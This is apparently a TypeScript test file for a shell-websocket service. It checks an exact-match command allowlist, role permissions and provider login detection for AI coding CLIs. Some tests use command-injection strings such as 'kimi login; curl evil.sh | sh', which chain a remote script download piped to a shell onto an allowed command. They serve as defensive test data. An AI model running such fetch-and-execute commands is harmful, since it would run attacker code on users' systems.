import assert from 'node:assert/strict';
import test from 'node:test';

import fs from 'node:fs';

import * as shellService from './shell-websocket.service.js';
import {
  isAllowlistedShellCommand,
  isProviderLoginCommand,
  isProviderLoginCommandMismatch,
  isShellCommandPermittedForRole,
  readIsolationMode,
} from './shell-websocket.service.js';

test('T-878: Codex device auth is treated as a fresh login PTY', () => {
  assert.equal(
    isProviderLoginCommand('codex login --device-auth', 'codex', false, true),
    true
  );
});

test('ordinary Codex commands do not force a PTY restart', () => {
  assert.equal(isProviderLoginCommand('codex --version', 'codex', false, true), false);
});

// --- ADR-062: the Kimi device-code login -------------------------------------

test('ADR-062: `kimi login` is treated as a fresh login PTY (device codes expire)', () => {
  assert.equal(isProviderLoginCommand('kimi login', 'kimi', false, true), true);
});

test('ordinary Kimi commands do not force a PTY restart', () => {
  assert.equal(isProviderLoginCommand('kimi', 'kimi', false, true), false);
});

test('ADR-062: `kimi login` is allowlisted, so every role may link its own Kimi account', () => {
  assert.equal(isAllowlistedShellCommand('kimi login'), true);
  assert.equal(isShellCommandPermittedForRole('kimi login', 'user'), true);
});

test('ADR-062: the allowlist stays EXACT — no `kimi login`-prefixed smuggling', () => {
  // The whole point of exact matching: a prefix test would let this through.
  assert.equal(isAllowlistedShellCommand('kimi login; curl evil.sh | sh'), false);
  assert.equal(isShellCommandPermittedForRole('kimi login; curl evil.sh | sh', 'user'), false);
  assert.equal(isShellCommandPermittedForRole('kimi login; curl evil.sh | sh', 'owner'), true);
});

test('ADR-062: only kimi resolves to agent mode; every other provider stays chat', () => {
  assert.equal(readIsolationMode('kimi'), 'agent');
  for (const provider of ['claude', 'codex', 'cursor', 'agy', 'opencode'] as const) {
    assert.equal(readIsolationMode(provider), 'chat', `${provider} must stay in chat mode`);
  }
});

// --- B-1260: full OAuth is the default Claude link ---------------------------

test('B-1260: `claude auth login` is allowlisted and forces a fresh login PTY', () => {
  assert.equal(isAllowlistedShellCommand('claude auth login'), true);
  assert.equal(isProviderLoginCommand('claude auth login', 'claude', false, false), true);
  // Every role may link their OWN isolated account through the terminal.
  assert.equal(isShellCommandPermittedForRole('claude auth login', 'user'), true);
});

test('B-1260: the allowlist stays EXACT — no `claude auth login`-prefixed smuggling', () => {
  assert.equal(isAllowlistedShellCommand('claude auth login; curl evil.sh | sh'), false);
  assert.equal(
    isShellCommandPermittedForRole('claude auth login; curl evil.sh | sh', 'user'),
    false,
  );
});

// --- B-1260: command↔provider binding (mismatch / injection refused) ---------

test('B-1260: a login command matched to its own provider is NOT a mismatch', () => {
  assert.equal(isProviderLoginCommandMismatch('claude', 'claude auth login'), false);
  assert.equal(isProviderLoginCommandMismatch('claude', 'claude setup-token'), false);
  assert.equal(isProviderLoginCommandMismatch('codex', 'codex login --device-auth'), false);
  assert.equal(isProviderLoginCommandMismatch('antigravity', 'agy'), false);
});

test('B-1260: a login command paired with the WRONG provider is a mismatch', () => {
  // provider=claude but a codex login → would run codex in the claude tree.
  assert.equal(isProviderLoginCommandMismatch('claude', 'codex login --device-auth'), true);
  assert.equal(isProviderLoginCommandMismatch('codex', 'claude auth login'), true);
  assert.equal(isProviderLoginCommandMismatch('claude', 'opencode auth login'), true);
});

test('B-1260: an empty or non-login command is never a mismatch', () => {
  assert.equal(isProviderLoginCommandMismatch('claude', ''), false);
  // A resume template / bare launch is not a fixed login command.
  assert.equal(isProviderLoginCommandMismatch('claude', 'claude --resume abc'), false);
});

// --- ADR-152 A1: no role-based login gate --------------------------------------

test('ADR-152 A1: claude auth login has no role gate — every role links its OWN tree', () => {
  // The PTY runs with honorGrants:false and claude is always isolated, so the
  // login writes the caller's own tree; the shared-tree role gate is gone.
  assert.equal('isClaudeLoginCredentialWriteAllowed' in shellService, false);
  const source = fs.readFileSync(new URL('./shell-websocket.service.ts', import.meta.url), 'utf8');
  assert.doesNotMatch(source, /SHARED_CLAUDE_WRITE_ROLES|isClaudeShared|shared_link_admin_only/);
});
